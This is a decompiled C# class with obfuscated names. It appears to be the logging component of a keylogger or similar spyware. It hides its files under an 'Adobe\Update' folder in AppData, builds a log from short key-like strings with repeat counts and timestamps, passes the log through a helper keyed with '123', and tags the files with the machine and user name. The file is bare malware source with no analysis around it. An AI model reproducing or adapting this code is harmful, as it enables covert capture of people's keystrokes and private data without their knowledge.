using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

public class GClass9
{
	private GClass1 gclass1_0 = new GClass1("123");

	private List<string> list_0 = new List<string>();

	private int int_0;

	private bool bool_0;

	private string string_0;

	private bool bool_1;

	private int int_1;

	private GClass10 gclass10_0 = new GClass10();

	[CompilerGenerated]
	private static string string_1;

	public static string String_0 => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Adobe");

	public static string String_1 => Path.Combine(String_0, "Update");

	public static string String_2
	{
		[CompilerGenerated]
		get
		{
			return string_1;
		}
		[CompilerGenerated]
		private set
		{
			string_1 = value;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern uint GetCompressedFileSizeW([In][MarshalAs(UnmanagedType.LPWStr)] string string_2, [MarshalAs(UnmanagedType.U4)] out uint uint_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern int GetDiskFreeSpaceW([In][MarshalAs(UnmanagedType.LPWStr)] string string_2, out uint uint_0, out uint uint_1, out uint uint_2, out uint uint_3);

	public GClass9()
	{
		bool flag = false;
		string empty = string.Empty;
		if (!Directory.Exists(String_1))
		{
			Directory.CreateDirectory(String_1);
		}
		if (flag)
		{
			String_2 = Path.Combine(String_1, empty);
		}
		else
		{
			method_0();
		}
	}

	public void method_0()
	{
		String_2 = Path.Combine(String_1, method_7());
		using (new StreamWriter(String_2))
		{
		}
		gclass10_0.method_0(String_2);
		bool_1 = true;
	}

	public void method_1(string string_2)
	{
		string text = string.Empty;
		if (!Directory.Exists(String_0))
		{
			Directory.CreateDirectory(String_0);
		}
		if (File.Exists(String_2))
		{
			text = gclass10_0.method_1(String_2);
			if (text == null)
			{
				method_10();
				text = string.Empty;
			}
		}
		else
		{
			method_10();
		}
		if (int_1 >= 1)
		{
			int_1++;
			string_2 = string_2 + " > " + int_1;
			int_1 = 0;
		}
		gclass10_0.method_3(String_2, text + string_2);
	}

	public void method_2(string string_2, int int_2)
	{
		if (string.IsNullOrEmpty(string_2.Trim()) && string_2 != " ")
		{
			return;
		}
		if (string_2 == string_0 && !method_4(string_2))
		{
			int_1++;
			return;
		}
		string_0 = string_2;
		bool flag = method_4(string_2);
		if (!bool_1)
		{
			if ((!flag && bool_0) || (flag && !bool_0) || (!flag && !bool_0))
			{
				string_2 = "\n" + string_2;
			}
		}
		else
		{
			bool_1 = false;
		}
		bool_0 = flag;
		if (int_1 >= 1)
		{
			int_1++;
			string_2 = " > " + int_1 + string_2;
			int_1 = 0;
		}
		if (int_2 == int_0)
		{
			string text = string.Empty;
			if (!Directory.Exists(String_0))
			{
				Directory.CreateDirectory(String_0);
			}
			if (File.Exists(String_2))
			{
				text = gclass10_0.method_1(String_2);
				if (text == null)
				{
					method_10();
					text = string.Empty;
				}
			}
			else
			{
				method_10();
			}
			string text2 = string.Empty;
			foreach (string item in list_0)
			{
				text2 += item;
			}
			gclass10_0.method_3(String_2, text + text2 + string_2);
			list_0.Clear();
			int_0 = 0;
		}
		else
		{
			list_0.Add(string_2);
			int_0++;
		}
	}

	public void method_3()
	{
		int_0 = 0;
		string text = string.Empty;
		string empty = string.Empty;
		for (int i = 0; i < list_0.Count; i++)
		{
			empty = list_0[i];
			text += empty;
		}
		method_1(text);
		list_0.Clear();
	}

	public bool method_4(string string_2)
	{
		if (string_2.Length != 2 && string_2.Length != 1)
		{
			return false;
		}
		return true;
	}

	public long method_5()
	{
		if (File.Exists(String_2))
		{
			FileInfo fileInfo = new FileInfo(String_2);
			return fileInfo.Length;
		}
		return 0L;
	}

	public long method_6()
	{
		return smethod_0(String_2);
	}

	private static long smethod_0(string string_2)
	{
		FileInfo fileInfo = new FileInfo(string_2);
		if (GetDiskFreeSpaceW(fileInfo.Directory!.Root.FullName, out var uint_, out var uint_2, out var uint_3, out uint_3) == 0)
		{
			return 0L;
		}
		uint num = uint_ * uint_2;
		uint uint_4;
		uint compressedFileSizeW = GetCompressedFileSizeW(string_2, out uint_4);
		long num2 = (long)(((ulong)uint_4 << 32) | compressedFileSizeW);
		return (num2 + num - 1L) / (long)num * num;
	}

	public string method_7()
	{
		string text = "2346789ABCDEFGHJKLMNPQRTUVWXYZabcdefghjkmnpqrtuvwxyz";
		Random random = new Random();
		string text2;
		do
		{
			text2 = string.Empty;
			while (text2.Length < 5)
			{
				text2 += text.Substring(random.Next(text.Length), 1);
			}
		}
		while (File.Exists(Path.Combine(String_1, text2)));
		return text2;
	}

	public void method_8()
	{
		method_1(DateTime.Now.ToString("dd.MM.yy - hh.mm.ss"));
	}

	public void method_9()
	{
		string[] files = Directory.GetFiles(Path.GetDirectoryName(String_2));
		foreach (string text in files)
		{
			gclass10_0.method_2(text, Environment.MachineName + "\\" + Environment.UserName + "~" + DateTime.Now.ToString("dd.MM.yy - HH.mm.ss"));
		}
	}

	private void method_10()
	{
		gclass10_0.method_0(String_2);
	}
}
